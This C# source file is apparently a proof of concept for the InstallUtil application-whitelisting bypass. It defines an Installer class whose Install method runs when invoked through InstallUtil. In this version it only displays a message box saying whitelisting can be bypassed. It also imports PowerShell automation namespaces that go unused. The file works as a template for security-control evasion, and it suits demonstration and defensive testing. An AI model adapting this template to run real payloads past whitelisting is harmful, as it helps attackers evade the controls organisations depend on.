using System;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Windows.Forms;

[System.ComponentModel.RunInstaller(true)]
public class InstallUtil : System.Configuration.Install.Installer
{
    public static void Main(string[] args)
    {
    }
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
    }

    public override void Install(System.Collections.IDictionary savedState)
    {
        MessageBox.Show("application whitelisting can be bypassed!");
    }
}